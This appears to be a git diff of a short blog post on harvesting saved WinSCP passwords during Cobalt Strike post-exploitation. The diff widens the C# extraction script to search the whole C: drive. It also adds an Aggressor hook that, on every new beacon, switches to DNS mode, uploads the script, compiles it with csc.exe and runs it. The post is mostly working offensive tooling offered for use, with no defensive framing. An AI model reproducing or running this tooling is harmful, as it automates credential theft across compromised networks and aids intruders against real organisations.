@@ -1,3 +1,8 @@
+---
+layout: post
+title: Find all WinSCP password in the sea
+---
+
 Using cobalt strike to do post-exploitation, it is really amazing to see so much WinSCP password in a single network. Extract it one-by-one is quite slow, wrote a script to extract and decrypt all of them.
 
 ```C#
@@ -12,7 +17,7 @@ namespace ConsoleApp1
     {
         public static void Main()
         {
-            string startFolder = @"c:\users\";
+            string startFolder = @"C:\";
 
           
             System.IO.DirectoryInfo dir = new System.IO.DirectoryInfo(startFolder);
@@ -74,5 +79,18 @@ namespace ConsoleApp1
             return fileContents;
         }
     }
+}
+```
+
+To initiate it in CS at start
+```
+on beacon_initial_empty {
+	bmode($1, "dns6");
+	bcheckin($1);
+	bsleep($1, 1);
+	
+	bupload($1, "C:\\Users\\user\\Desktop\\search_ini.cs");
+	bpowerpick($1, "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe search_ini.cs");
+	bpowerpick($1, "search_ini.exe");
 }
 ```
